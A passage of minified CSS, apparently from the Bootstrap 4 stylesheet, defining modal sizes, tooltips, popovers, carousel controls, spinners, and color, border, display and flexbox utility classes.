- 3.5rem);  }  .modal-dialog-centered::before {    height: calc(100vh - 3.5rem);  }  .modal-sm {    max-width: 300px;  }}@media (min-width: 992px) {  .modal-lg,  .modal-xl {    max-width: 800px;  }}@media (min-width: 1200px) {  .modal-xl {    max-width: 1140px;  }}.tooltip {  position: absolute;  z-index: 1070;  display: block;  margin: 0;  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";  font-style: normal;  font-weight: 400;  line-height: 1.5;  text-align: left;  text-align: start;  text-decoration: none;  text-shadow: none;  text-transform: none;  letter-spacing: normal;  word-break: normal;  word-spacing: normal;  white-space: normal;  line-break: auto;  font-size: 0.875rem;  word-wrap: break-word;  opacity: 0;}.tooltip.show {  opacity: 0.9;}.tooltip .arrow {  position: absolute;  display: block;  width: 0.8rem;  height: 0.4rem;}.tooltip .arrow::before {  position: absolute;  content: "";  border-color: transparent;  border-style: solid;}.bs-tooltip-top, .bs-tooltip-auto[x-placement^="top"] {  padding: 0.4rem 0;}.bs-tooltip-top .arrow, .bs-tooltip-auto[x-placement^="top"] .arrow {  bottom: 0;}.bs-tooltip-top .arrow::before, .bs-tooltip-auto[x-placement^="top"] .arrow::before {  top: 0;  border-width: 0.4rem 0.4rem 0;  border-top-color: #000;}.bs-tooltip-right, .bs-tooltip-auto[x-placement^="right"] {  padding: 0 0.4rem;}.bs-tooltip-right .arrow, .bs-tooltip-auto[x-placement^="right"] .arrow {  left: 0;  width: 0.4rem;  height: 0.8rem;}.bs-tooltip-right .arrow::before, .bs-tooltip-auto[x-placement^="right"] .arrow::before {  right: 0;  border-width: 0.4rem 0.4rem 0.4rem 0;  border-right-color: #000;}.bs-tooltip-bottom, .bs-tooltip-auto[x-placement^="bottom"] {  padding: 0.4rem 0;}.bs-tooltip-bottom .arrow, .bs-tooltip-auto[x-placement^="bottom"] .arrow {  top: 0;}.bs-tooltip-bottom .arrow::before, .bs-tooltip-auto[x-placement^="bottom"] .arrow::before {  bottom: 0;  border-width: 0 0.4rem 0.4rem;  border-bottom-color: #000;}.bs-tooltip-left, .bs-tooltip-auto[x-placement^="left"] {  padding: 0 0.4rem;}.bs-tooltip-left .arrow, .bs-tooltip-auto[x-placement^="left"] .arrow {  right: 0;  width: 0.4rem;  height: 0.8rem;}.bs-tooltip-left .arrow::before, .bs-tooltip-auto[x-placement^="left"] .arrow::before {  left: 0;  border-width: 0.4rem 0 0.4rem 0.4rem;  border-left-color: #000;}.tooltip-inner {  max-width: 200px;  padding: 0.25rem 0.5rem;  color: #fff;  text-align: center;  background-color: #000;  border-radius: 0.25rem;}.popover {  position: absolute;  top: 0;  left: 0;  z-index: 1060;  display: block;  max-width: 276px;  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";  font-style: normal;  font-weight: 400;  line-height: 1.5;  text-align: left;  text-align: start;  text-decoration: none;  text-shadow: none;  text-transform: none;  letter-spacing: normal;  word-break: normal;  word-spacing: normal;  white-space: normal;  line-break: auto;  font-size: 0.875rem;  word-wrap: break-word;  background-color: #fff;  background-clip: padding-box;  border: 1px solid rgba(0, 0, 0, 0.2);  border-radius: 0.3rem;}.popover .arrow {  position: absolute;  display: block;  width: 1rem;  height: 0.5rem;  margin: 0 0.3rem;}.popover .arrow::before, .popover .arrow::after {  position: absolute;  display: block;  content: "";  border-color: transparent;  border-style: solid;}.bs-popover-top, .bs-popover-auto[x-placement^="top"] {  margin-bottom: 0.5rem;}.bs-popover-top > .arrow, .bs-popover-auto[x-placement^="top"] > .arrow {  bottom: calc((0.5rem + 1px) * -1);}.bs-popover-top > .arrow::before, .bs-popover-auto[x-placement^="top"] > .arrow::before {  bottom: 0;  border-width: 0.5rem 0.5rem 0;  border-top-color: rgba(0, 0, 0, 0.25);}.bs-popover-top > .arrow::after, .bs-popover-auto[x-placement^="top"] > .arrow::after {  bottom: 1px;  border-width: 0.5rem 0.5rem 0;  border-top-color: #fff;}.bs-popover-right, .bs-popover-auto[x-placement^="right"] {  margin-left: 0.5rem;}.bs-popover-right > .arrow, .bs-popover-auto[x-placement^="right"] > .arrow {  left: calc((0.5rem + 1px) * -1);  width: 0.5rem;  height: 1rem;  margin: 0.3rem 0;}.bs-popover-right > .arrow::before, .bs-popover-auto[x-placement^="right"] > .arrow::before {  left: 0;  border-width: 0.5rem 0.5rem 0.5rem 0;  border-right-color: rgba(0, 0, 0, 0.25);}.bs-popover-right > .arrow::after, .bs-popover-auto[x-placement^="right"] > .arrow::after {  left: 1px;  border-width: 0.5rem 0.5rem 0.5rem 0;  border-right-color: #fff;}.bs-popover-bottom, .bs-popover-auto[x-placement^="bottom"] {  margin-top: 0.5rem;}.bs-popover-bottom > .arrow, .bs-popover-auto[x-placement^="bottom"] > .arrow {  top: calc((0.5rem + 1px) * -1);}.bs-popover-bottom > .arrow::before, .bs-popover-auto[x-placement^="bottom"] > .arrow::before {  top: 0;  border-width: 0 0.5rem 0.5rem 0.5rem;  border-bottom-color: rgba(0, 0, 0, 0.25);}.bs-popover-bottom > .arrow::after, .bs-popover-auto[x-placement^="bottom"] > .arrow::after {  top: 1px;  border-width: 0 0.5rem 0.5rem 0.5rem;  border-bottom-color: #fff;}.bs-popover-bottom .popover-header::before, .bs-popover-auto[x-placement^="bottom"] .popover-header::before {  position: absolute;  top: 0;  left: 50%;  display: block;  width: 1rem;  margin-left: -0.5rem;  content: "";  border-bottom: 1px solid #f7f7f7;}.bs-popover-left, .bs-popover-auto[x-placement^="left"] {  margin-right: 0.5rem;}.bs-popover-left > .arrow, .bs-popover-auto[x-placement^="left"] > .arrow {  right: calc((0.5rem + 1px) * -1);  width: 0.5rem;  height: 1rem;  margin: 0.3rem 0;}.bs-popover-left > .arrow::before, .bs-popover-auto[x-placement^="left"] > .arrow::before {  right: 0;  border-width: 0.5rem 0 0.5rem 0.5rem;  border-left-color: rgba(0, 0, 0, 0.25);}.bs-popover-left > .arrow::after, .bs-popover-auto[x-placement^="left"] > .arrow::after {  right: 1px;  border-width: 0.5rem 0 0.5rem 0.5rem;  border-left-color: #fff;}.popover-header {  padding: 0.5rem 0.75rem;  margin-bottom: 0;  font-size: 1rem;  background-color: #f7f7f7;  border-bottom: 1px solid #ebebeb;  border-top-left-radius: calc(0.3rem - 1px);  border-top-right-radius: calc(0.3rem - 1px);}.popover-header:empty {  display: none;}.popover-body {  padding: 0.5rem 0.75rem;  color: #212529;}.carousel {  position: relative;}.carousel.pointer-event {  -ms-touch-action: pan-y;  touch-action: pan-y;}.carousel-inner {  position: relative;  width: 100%;  overflow: hidden;}.carousel-inner::after {  display: block;  clear: both;  content: "";}.carousel-item {  position: relative;  display: none;  float: left;  width: 100%;  margin-right: -100%;  -webkit-backface-visibility: hidden;  backface-visibility: hidden;  transition: -webkit-transform 0.6s ease-in-out;  transition: transform 0.6s ease-in-out;  transition: transform 0.6s ease-in-out, -webkit-transform 0.6s ease-in-out;}@media (prefers-reduced-motion: reduce) {  .carousel-item {    transition: none;  }}.carousel-item.active,.carousel-item-next,.carousel-item-prev {  display: block;}.carousel-item-next:not(.carousel-item-left),.active.carousel-item-right {  -webkit-transform: translateX(100%);  transform: translateX(100%);}.carousel-item-prev:not(.carousel-item-right),.active.carousel-item-left {  -webkit-transform: translateX(-100%);  transform: translateX(-100%);}.carousel-fade .carousel-item {  opacity: 0;  transition-property: opacity;  -webkit-transform: none;  transform: none;}.carousel-fade .carousel-item.active,.carousel-fade .carousel-item-next.carousel-item-left,.carousel-fade .carousel-item-prev.carousel-item-right {  z-index: 1;  opacity: 1;}.carousel-fade .active.carousel-item-left,.carousel-fade .active.carousel-item-right {  z-index: 0;  opacity: 0;  transition: 0s 0.6s opacity;}@media (prefers-reduced-motion: reduce) {  .carousel-fade .active.carousel-item-left,  .carousel-fade .active.carousel-item-right {    transition: none;  }}.carousel-control-prev,.carousel-control-next {  position: absolute;  top: 0;  bottom: 0;  z-index: 1;  display: -ms-flexbox;  display: flex;  -ms-flex-align: center;  align-items: center;  -ms-flex-pack: center;  justify-content: center;  width: 15%;  color: #fff;  text-align: center;  opacity: 0.5;  transition: opacity 0.15s ease;}@media (prefers-reduced-motion: reduce) {  .carousel-control-prev,  .carousel-control-next {    transition: none;  }}.carousel-control-prev:hover, .carousel-control-prev:focus,.carousel-control-next:hover,.carousel-control-next:focus {  color: #fff;  text-decoration: none;  outline: 0;  opacity: 0.9;}.carousel-control-prev {  left: 0;}.carousel-control-next {  right: 0;}.carousel-control-prev-icon,.carousel-control-next-icon {  display: inline-block;  width: 20px;  height: 20px;  background: no-repeat 50% / 100% 100%;}.carousel-control-prev-icon {  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 8 8'%3e%3cpath d='M5.25 0l-4 4 4 4 1.5-1.5-2.5-2.5 2.5-2.5-1.5-1.5z'/%3e%3c/svg%3e");}.carousel-control-next-icon {  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 8 8'%3e%3cpath d='M2.75 0l-1.5 1.5 2.5 2.5-2.5 2.5 1.5 1.5 4-4-4-4z'/%3e%3c/svg%3e");}.carousel-indicators {  position: absolute;  right: 0;  bottom: 0;  left: 0;  z-index: 15;  display: -ms-flexbox;  display: flex;  -ms-flex-pack: center;  justify-content: center;  padding-left: 0;  margin-right: 15%;  margin-left: 15%;  list-style: none;}.carousel-indicators li {  box-sizing: content-box;  -ms-flex: 0 1 auto;  flex: 0 1 auto;  width: 30px;  height: 3px;  margin-right: 3px;  margin-left: 3px;  text-indent: -999px;  cursor: pointer;  background-color: #fff;  background-clip: padding-box;  border-top: 10px solid transparent;  border-bottom: 10px solid transparent;  opacity: .5;  transition: opacity 0.6s ease;}@media (prefers-reduced-motion: reduce) {  .carousel-indicators li {    transition: none;  }}.carousel-indicators .active {  opacity: 1;}.carousel-caption {  position: absolute;  right: 15%;  bottom: 20px;  left: 15%;  z-index: 10;  padding-top: 20px;  padding-bottom: 20px;  color: #fff;  text-align: center;}@-webkit-keyframes spinner-border {  to {    -webkit-transform: rotate(360deg);    transform: rotate(360deg);  }}@keyframes spinner-border {  to {    -webkit-transform: rotate(360deg);    transform: rotate(360deg);  }}.spinner-border {  display: inline-block;  width: 2rem;  height: 2rem;  vertical-align: text-bottom;  border: 0.25em solid currentColor;  border-right-color: transparent;  border-radius: 50%;  -webkit-animation: spinner-border .75s linear infinite;  animation: spinner-border .75s linear infinite;}.spinner-border-sm {  width: 1rem;  height: 1rem;  border-width: 0.2em;}@-webkit-keyframes spinner-grow {  0% {    -webkit-transform: scale(0);    transform: scale(0);  }  50% {    opacity: 1;  }}@keyframes spinner-grow {  0% {    -webkit-transform: scale(0);    transform: scale(0);  }  50% {    opacity: 1;  }}.spinner-grow {  display: inline-block;  width: 2rem;  height: 2rem;  vertical-align: text-bottom;  background-color: currentColor;  border-radius: 50%;  opacity: 0;  -webkit-animation: spinner-grow .75s linear infinite;  animation: spinner-grow .75s linear infinite;}.spinner-grow-sm {  width: 1rem;  height: 1rem;}.align-baseline {  vertical-align: baseline !important;}.align-top {  vertical-align: top !important;}.align-middle {  vertical-align: middle !important;}.align-bottom {  vertical-align: bottom !important;}.align-text-bottom {  vertical-align: text-bottom !important;}.align-text-top {  vertical-align: text-top !important;}.bg-primary {  background-color: #007bff !important;}a.bg-primary:hover, a.bg-primary:focus,button.bg-primary:hover,button.bg-primary:focus {  background-color: #0062cc !important;}.bg-secondary {  background-color: #6c757d !important;}a.bg-secondary:hover, a.bg-secondary:focus,button.bg-secondary:hover,button.bg-secondary:focus {  background-color: #545b62 !important;}.bg-success {  background-color: #28a745 !important;}a.bg-success:hover, a.bg-success:focus,button.bg-success:hover,button.bg-success:focus {  background-color: #1e7e34 !important;}.bg-info {  background-color: #17a2b8 !important;}a.bg-info:hover, a.bg-info:focus,button.bg-info:hover,button.bg-info:focus {  background-color: #117a8b !important;}.bg-warning {  background-color: #ffc107 !important;}a.bg-warning:hover, a.bg-warning:focus,button.bg-warning:hover,button.bg-warning:focus {  background-color: #d39e00 !important;}.bg-danger {  background-color: #dc3545 !important;}a.bg-danger:hover, a.bg-danger:focus,button.bg-danger:hover,button.bg-danger:focus {  background-color: #bd2130 !important;}.bg-light {  background-color: #f8f9fa !important;}a.bg-light:hover, a.bg-light:focus,button.bg-light:hover,button.bg-light:focus {  background-color: #dae0e5 !important;}.bg-dark {  background-color: #343a40 !important;}a.bg-dark:hover, a.bg-dark:focus,button.bg-dark:hover,button.bg-dark:focus {  background-color: #1d2124 !important;}.bg-white {  background-color: #fff !important;}.bg-transparent {  background-color: transparent !important;}.border {  border: 1px solid #dee2e6 !important;}.border-top {  border-top: 1px solid #dee2e6 !important;}.border-right {  border-right: 1px solid #dee2e6 !important;}.border-bottom {  border-bottom: 1px solid #dee2e6 !important;}.border-left {  border-left: 1px solid #dee2e6 !important;}.border-0 {  border: 0 !important;}.border-top-0 {  border-top: 0 !important;}.border-right-0 {  border-right: 0 !important;}.border-bottom-0 {  border-bottom: 0 !important;}.border-left-0 {  border-left: 0 !important;}.border-primary {  border-color: #007bff !important;}.border-secondary {  border-color: #6c757d !important;}.border-success {  border-color: #28a745 !important;}.border-info {  border-color: #17a2b8 !important;}.border-warning {  border-color: #ffc107 !important;}.border-danger {  border-color: #dc3545 !important;}.border-light {  border-color: #f8f9fa !important;}.border-dark {  border-color: #343a40 !important;}.border-white {  border-color: #fff !important;}.rounded-sm {  border-radius: 0.2rem !important;}.rounded {  border-radius: 0.25rem !important;}.rounded-top {  border-top-left-radius: 0.25rem !important;  border-top-right-radius: 0.25rem !important;}.rounded-right {  border-top-right-radius: 0.25rem !important;  border-bottom-right-radius: 0.25rem !important;}.rounded-bottom {  border-bottom-right-radius: 0.25rem !important;  border-bottom-left-radius: 0.25rem !important;}.rounded-left {  border-top-left-radius: 0.25rem !important;  border-bottom-left-radius: 0.25rem !important;}.rounded-lg {  border-radius: 0.3rem !important;}.rounded-circle {  border-radius: 50% !important;}.rounded-pill {  border-radius: 50rem !important;}.rounded-0 {  border-radius: 0 !important;}.clearfix::after {  display: block;  clear: both;  content: "";}.d-none {  display: none !important;}.d-inline {  display: inline !important;}.d-inline-block {  display: inline-block !important;}.d-block {  display: block !important;}.d-table {  display: table !important;}.d-table-row {  display: table-row !important;}.d-table-cell {  display: table-cell !important;}.d-flex {  display: -ms-flexbox !important;  display: flex !important;}.d-inline-flex {  display: -ms-inline-flexbox !important;  display: inline-flex !important;}@media (min-width: 576px) {  .d-sm-none {    display: none !important;  }  .d-sm-inline {    display: inline !important;  }  .d-sm-inline-block {    display: inline-block !important;  }  .d-sm-block {    display: block !important;  }  .d-sm-table {    display: table !important;  }  .d-sm-table-row {    display: table-row !important;  }  .d-sm-table-cell {    display: table-cell !important;  }  .d-sm-flex {    display: -ms-flexbox !important;    display: flex !important;  }  .d-sm-inline-flex {    display: -ms-inline-flexbox !important;    display: inline-flex !important;  }}@media (min-width: 768px) {  .d-md-none {    display: none !important;  }  .d-md-inline {    display: inline !important;  }  .d-md-inline-block {    display: inline-block !important;  }  .d-md-block {    display: block !important;  }  .d-md-table {    display: table !important;  }  .d-md-table-row {    display: table-row !important;  }  .d-md-table-cell {    display: table-cell !important;  }  .d-md-flex {    display: -ms-flexbox !important;    display: flex !important;  }  .d-md-inline-flex {    display: -ms-inline-flexbox !important;    display: inline-flex !important;  }}@media (min-width: 992px) {  .d-lg-none {    display: none !important;  }  .d-lg-inline {    display: inline !important;  }  .d-lg-inline-block {    display: inline-block !important;  }  .d-lg-block {    display: block !important;  }  .d-lg-table {    display: table !important;  }  .d-lg-table-row {    display: table-row !important;  }  .d-lg-table-cell {    display: table-cell !important;  }  .d-lg-flex {    display: -ms-flexbox !important;    display: flex !important;  }  .d-lg-inline-flex {    display: -ms-inline-flexbox !important;    display: inline-flex !important;  }}@media (min-width: 1200px) {  .d-xl-none {    display: none !important;  }  .d-xl-inline {    display: inline !important;  }  .d-xl-inline-block {    display: inline-block !important;  }  .d-xl-block {    display: block !important;  }  .d-xl-table {    display: table !important;  }  .d-xl-table-row {    display: table-row !important;  }  .d-xl-table-cell {    display: table-cell !important;  }  .d-xl-flex {    display: -ms-flexbox !important;    display: flex !important;  }  .d-xl-inline-flex {    display: -ms-inline-flexbox !important;    display: inline-flex !important;  }}@media print {  .d-print-none {    display: none !important;  }  .d-print-inline {    display: inline !important;  }  .d-print-inline-block {    display: inline-block !important;  }  .d-print-block {    display: block !important;  }  .d-print-table {    display: table !important;  }  .d-print-table-row {    display: table-row !important;  }  .d-print-table-cell {    display: table-cell !important;  }  .d-print-flex {    display: -ms-flexbox !important;    display: flex !important;  }  .d-print-inline-flex {    display: -ms-inline-flexbox !important;    display: inline-flex !important;  }}.embed-responsive {  position: relative;  display: block;  width: 100%;  padding: 0;  overflow: hidden;}.embed-responsive::before {  display: block;  content: "";}.embed-responsive .embed-responsive-item,.embed-responsive iframe,.embed-responsive embed,.embed-responsive object,.embed-responsive video {  position: absolute;  top: 0;  bottom: 0;  left: 0;  width: 100%;  height: 100%;  border: 0;}.embed-responsive-21by9::before {  padding-top: 42.857143%;}.embed-responsive-16by9::before {  padding-top: 56.25%;}.embed-responsive-4by3::before {  padding-top: 75%;}.embed-responsive-1by1::before {  padding-top: 100%;}.flex-row {  -ms-flex-direction: row !important;  flex-direction: row !important;}.flex-column {  -ms-flex-direction: column !important;  flex-direction: column !important;}.flex-row-reverse {  -ms-flex-direction: row-reverse !important;  flex-direction: row-reverse !important;}.flex-column-reverse {  -ms-flex-direction: column-reverse !important;  flex-direction: column-reverse !important;}.flex-wrap {  -ms-flex-wrap: wrap !important;  flex-wrap: wrap !important;}.flex-nowrap {  -ms-flex-wrap: nowrap !important;  flex-wrap: nowrap !important;}.flex-wrap-reverse {  -ms-flex-wrap: wrap-reverse !important;  flex-wrap: wrap-reverse !important;}.flex-fill {  -ms-flex: 1 1 auto !important;  flex: 1 1 auto !important;}.flex-grow-0 {  -ms-flex-positive: 0 !important;  flex-grow: 0 !important;}.flex-grow-1 {  -ms-flex-positive: 1 !important;  flex-grow: 1 !important;}.flex-shrink-0 {  -ms-flex-negative: 0 !important;  flex-shrink: 0 !important;}.flex-shrink-1 {  -ms-flex-negative: 1 !important;  flex-shrink: 1 !important;}.justify-content-start {  -ms-flex-pack: start !important;  justify-content: flex-start !important;}.justify-content-end {  -ms-flex-pack: end !important;  justify-content: flex-end !important;}.justify-content-center {  -ms-flex-pack: center !important;  justify-content: center !important;}.justify-content-between {  -ms-flex-pack: justify !important;  justify-content: space-between !important;}.justify-content-around {  -ms-flex-pack: distribute !important;  justify-content: space-around !important;}.align-items-start {  -ms-flex-align: start !important;  align-items: flex-start !important;}.align-items-end {  -ms-flex-align: end !important;  align-items: flex-end !important;}.align-items-center {  -ms-flex-align: center !important;  align-items: center !important;}.align-items-baseline {  -ms-flex-align: baseline !important;  align-items: baseline !important;}.align-items-stretch {  -ms-flex-align: stretch !important;  align-items: stretch !important;}.align-content-start {  -ms-flex-line-pack: start !important;  align-content: flex-start !important;}.align-content-end {  -ms-flex-line-pack: end !important;  align-content: flex-end !important;}.align-content-center {  -ms-flex-line-pack: center !important;  align-content: center !important;}.align-content-between {  -ms-flex-line-pack: justify !important;  align-content: space-between !important;}.align-content-around {  -ms-flex-line-pack: distribute !important;  align-content: space-around !important;}.align-content-stretch {  -ms-flex-line-pack: stretch !important;  align-content: stretch !important;}.align-self-auto {  -ms-flex-item-align: auto !important;  align-self: auto !important;}.align-self-start {  -ms-flex-item-align: start !important;  align-self: flex-start !important;}.align-self-end {  -ms-flex-item-align: end !important;  align-self: flex-end !important;}.align-self-center {  -ms-flex-item-align: center !important;  align-self: center !important;}.align-self-baseline {  -ms-flex-item-align: baseline !important;  align-self: baseline !important;}.align-self-stretch {  -ms-flex-item-align: stretch !important;  align-self: stretch !important;}@media (min-width: 576px) {  .flex-sm-row {    -ms-flex-direction: row !important;    flex-direction: row !important;  }  .flex-sm-column {    -ms-flex-direction: column !important;    flex-direction: column !important;  }  .flex-sm-row-reverse {    -ms-flex-direction: row-reverse !important;    flex-direction: row-reverse !important;  }  .flex-sm-column-reverse {    -ms-flex-direction: column-reverse !important;    flex-direction: column-reverse !important;  }  .flex-sm-wrap {    -ms-flex-wrap: wrap !important;    flex-wrap: wrap !important;  }  .flex-sm-nowrap {    -ms-flex-wrap: nowrap !important;    flex-wrap: nowrap !important;  }  .flex-sm-wrap-reverse {    -ms-flex-wrap: wrap-reverse !important;    flex-wrap: wrap-reverse !important;  }  .flex-sm-fill {    -ms-flex: 1 1 auto !important;    flex: 1 1 auto !important;  }  .flex-sm-grow-0 {    -ms-flex-positive: 0 !important;    flex-grow: 0 !important;  }  .flex-sm-grow-1 {    -ms-flex-positive: 1 !important;    flex-grow: 1 !important;  }  .flex-sm-shrink-0 {    -ms-flex-negative: 0 !important;    flex-shrink: 0 !important;  }  .flex-sm-shrink-1 {    -ms-flex-negative: 1 !important;    flex-shrink: 1 !important;  }  .justify-content-sm-start {    -ms-flex-pack: start !important;    justify-content: flex-start !important;  }  .justify-content-sm-end {    -ms-flex-pack: end !important;    justify-content: flex-end !important;  }  .justify-content-sm-center {    -ms-flex-pack: center !important;    justify-content: center !important;  }  .justify-content-sm-between {    -ms-flex-pack: justify !important;    justify-content: space-between !important;  }  .justify-content-sm-around {    -ms-flex-pack: distribute !important;    justify-content: space-around !important;  }  .align-items-sm-start {    -ms-flex-align: start !important;    align-items: flex-start !important;  }  .align-items-sm-end {    -ms-flex-align: end !important;    align-items: flex-end !important;  }  .align-items-sm-center {    -ms-flex-align: center !important;    align-items: center !important;  }  .align-items-sm-baseline {    -ms-flex-align: baseline !important;    align-items: baseline !important;  }  .align-items-sm-stretch {    -ms-flex-align: stretch !important;    align-items: stretch !important;  }  .align-content-sm-start {    -ms-flex-line-pack: start !important;    align-content: flex-start !important;  }  .align-content-sm-end {    -ms-flex-line-pack: end !important;    align-content: flex-end !important;  }  .align-content-sm-center {    -ms-flex-line-pack: center !important;    align-content: center !important;  }  .align-content-sm-between {    -ms-flex-line-pack: justify !important;    align-content: space-between !important;  }  .align-content-sm-around {    -ms-flex-line-pack: distribute !important;    align-content: space-around !important;  }  .align-content-sm-stretch {    -ms-flex-line-pack: stretch !important;    align-content: stretch !important;  }  .align-self-sm-auto {    -ms-flex-item-align: auto !important;    align-self: auto !important;  }  .align-self-sm-start {    -ms-flex-item-align: start !important;    align-self: flex-start !important;  }  .align-self-sm-end {    -ms-flex-item-align: end !important;    align-self: flex-end !important;  }  .align-self-sm-center {    -ms-flex-item-align: center !important;    align-self: center !important;  }  .align-self-sm-baseline {    -ms-flex-item-align: baseline !important;    align-self: baseline !important;  }  .align-self-sm-stretch {    -ms-flex-item-align: stretch !important;    align-self: stretch !important;  }}@media (min-width: 768px) {  .flex-md-row {    -ms-flex-direction: row !important;    flex-direction: row !important;  }  .flex-md-column {    -ms-flex-direction: column !important;    flex-direction: column !important;  }  .flex-md-row-reverse {    -ms-flex-direction: row-reverse !important;    flex-direction: row-reverse !important;  }  .flex-md-column-reverse {    -ms-flex-direction: column-reverse !important;    flex-direction: column-reverse !important;  }  .flex-md-wrap {    -ms-flex-wrap: wrap !important;    flex-wrap: wrap !important;  }  .flex-md-nowrap {    -ms-flex-wrap: nowrap !important;    flex-wrap: nowrap !important;  }  .flex-md-wrap-reverse {    -ms-flex-wrap: wrap-reverse !important;    flex-wrap: wrap-reverse !important;  }  .flex-md-fill {    -ms-flex: 1 1 auto !important;    flex: 1 1 auto !important;  }  .flex-md-grow-0 {    -ms-flex-positive: 0 !important;    flex-grow: 0 !important;  }  .flex-md-grow-1 {    -ms-flex-positive: 1 !important;    flex-grow: 1 !important;  }  .flex-md-shrink-0 {    -ms-flex-negative: 0 !important;    flex-shrink: 0 !important;  }  .flex-md-shrink-1 {    -ms-flex-negative: 1 !important;    flex-shrink: 1 !important;  }  .justify-content-md-start {    -ms-flex-pack: start !important;    justify-content: flex-start !important;  }  .justify-content-md-end {    -ms-flex-pack: end !important;    justify-content: flex-end !important;  }  .justify-content-md-center {    -ms-flex-pack: center !important;    justify-content: center !important;  }  .justify-content-md-between {    -ms-flex-pack: justify !important;    justify-content: space-between !important;  }  .justify-content-md-around {    -ms-flex-pack: distribute !important;    justify-content: space-around !important;  }  .align-items-md-start {    -ms-flex-align: start !important;    align-items: flex-start !important;  }  .align-items-md-end {    -ms-flex-align: end !important;    align-items: flex-end !important;  }  .align-items-md-center {    -ms-flex-align: center !important;    align-items: center !important;  }  .align-items-md-baseline {    -ms-flex-align: baseline !important;    align-items: baseline !important;  }  .align-items-md-stretch {    -ms-flex-align: stretch !important;    align-items: stretch !important;  }  .align-content-md-start {    -ms-flex-line-pack: start !important;    align-content: flex-start !important;  }  .align-content-md-end {    -ms-flex-line-pack: end !important;    align-content: flex-end !important;  }  .align-content-md-center {    -ms-flex-line-pack: center !important;    align-content: center !important;  }  .align-content-md-between {    -ms-flex-line-pack: justify !important;    align-content: space-between !important;  }  .align-content-md-around {    -ms-flex-line-pack: distribute !important;    align-content: space-around !important;  }  .align-content-md-stretch {    -ms-flex-line-pack: stretch !important;    align-content: stretch !important;  }  .align-self-md-auto {    -ms-flex-item-align: auto !important;    align-self: auto !important;  }  .align-self-md-start {    -ms-flex-item-align: start !important;    align-self: flex-start !important;  }  .align-self-md-end {    -ms-flex-item-align: end !important;    align-self: flex-end !important;  }  .align-self-md-center {    -ms-flex-item-align: center !important;    align-self: center !important;  }  .align-self-md-baseline {    -ms-flex-item-align: baseline !important;    align-self: baseline !important;  }  .align-self-md-stretch {    -ms-flex-item-align: stretch !important;    align-self: stretch !important;  }}@media (min-width: 992px) {  .flex-lg-row {    -ms-flex-direction: row !important;    flex-direction: row !important;  }  .flex-lg-column {    -ms-flex-direction: column !important;    flex-direction: column !important;  }  .flex-lg-row-reverse {    -ms-flex-direction: row-reverse !important;    flex-direction: row-reverse !important;  }  .flex-lg-column-reverse {    -ms-flex-direction: column-reverse !important;    flex-direction: column-reverse !important;  }  .flex-lg-wrap {    -ms-flex-wrap: wrap !important;    flex-wrap: wrap !important;  }  .flex-lg-nowrap {    -ms-flex-wrap: nowrap !important;    flex-wrap: nowrap !important;  }  .flex-lg-wrap-reverse {    -ms-flex-wrap: wrap-reverse !important;    flex-wrap: wrap-reverse !important;  }  .flex-lg-fill {    -ms-flex: 1 1 auto !important;    flex: 1 1 auto !important;  }  .flex-lg-grow-0 {    -ms-flex-positive: 0 !important;    flex-grow: 0 !important;  }  .flex-lg-grow-1 {    -ms-flex-positive: 1 !important;    flex-grow: 1 !important;  }  .flex-lg-shrink-0 {    -ms-flex-negative: 0 !important;    flex-shrink: 0 !important;  }  .flex-lg-shrink-1 {    -ms-flex-negative: 1 !important;    flex-shrink: 1 !important;  }  .justify-content-lg-start {    -ms-flex-pack: start !important;    justify-content: flex-start !important;  }  .justify-content-lg-end {    -ms-flex-pack: end !important;    justify-content: flex-end !important;  }  .justify-content-lg-center {    -ms-flex-pack: center !important;    justify-content: center !important;  }  .justify-content-lg-between {    -ms-flex-pack: justify !important;    justify-content: space-between !important;  }  .justify-content-lg-around {    -ms-flex-pack: distribute !important;    justify-content: space-around !important;  }  .align-items-lg-start {    -ms-flex-align: start !important;    align-items: flex-start !important;  }  .align-items-lg-end {    -ms-flex-align: end !important;    align-items: flex-end !important;  }  .align-items-lg-center {    -ms-flex-align: center !important;    align-items: center !important;  }  .align-items-lg-baseline {    -ms-flex-align: baseline !important;    align-items: baseline !important;  }  .align-items-lg-stretch {    -ms-flex-align: stretch !important;    align-items: stretch !important;  }  .align-content-lg-start {    -ms-flex-line-pack: start !important;    align-content: flex-start !important;  }  .align-content-lg-end {    -ms-flex-line-pack: end !important;    align-content: flex-end !important;  }  .align-content-lg-center {    -ms-flex-line-pack: center !important;    align-content: center !important;  }  .align-content-lg-between {    -ms-flex-line-pack: justify !important;    align-content: space-between !important;  }  .align-content-lg-around {    -ms-flex-line-pack: distribute !important;    align-content: space-around !important;  }  .align-content-lg-stretch {    -ms-flex-line-pack: stretch !important;    align-content: stretch !important;  }  .align-self-lg-auto {    -ms-flex-item-align: auto !important;    align-self: auto !important;  }  .align-self-lg-start {    -ms-flex-item-align: start !important;    align-self: flex-start !important;  }  .align-self-lg-end {    -ms-flex-item-align: end !important;    align-self: flex-end !important;  }  .align-self-lg-center {    -ms-flex-item-align: center !important;    align-self: center !important;  }  .align-self-lg-baseline {    -ms-flex-item-align: baseline !important;    align-self: baseline !important;  }  .align-self-lg-stretch {    -ms-flex-item-align: stretch !important;    align-self: stretch !important;  }}@media (min-width: 1200px) {  .flex-xl-row {    -ms-flex-direction: row !important;    flex-direction: row !important;  }  .flex-xl-column {    -ms-flex-direction: column !important;    flex-direction: column !important;  }  .flex-xl-row-reverse {    -ms-flex-direction: row-reverse !important;    flex-direction: row-reverse !important;  }  .flex-xl-column-reverse {    -ms-flex-direction: column-reverse !important;    flex-direction: column-reverse !important;  }  .flex-xl-wrap {    -ms-flex-wrap: wrap !important;    flex-wrap: wrap !important;  }  .flex-xl-nowrap {    -ms-flex-wrap: nowrap !important;    flex-wrap: nowrap !important;  }  .flex-xl-wrap-reverse {    -ms-flex-wrap: wrap-reverse !important;    flex-wrap: wrap-reverse !important;  }  .flex-xl-fill {    -ms-flex: 1 1 auto !important;    flex: 1 1 auto !important;  }  .flex-xl-grow-0 {    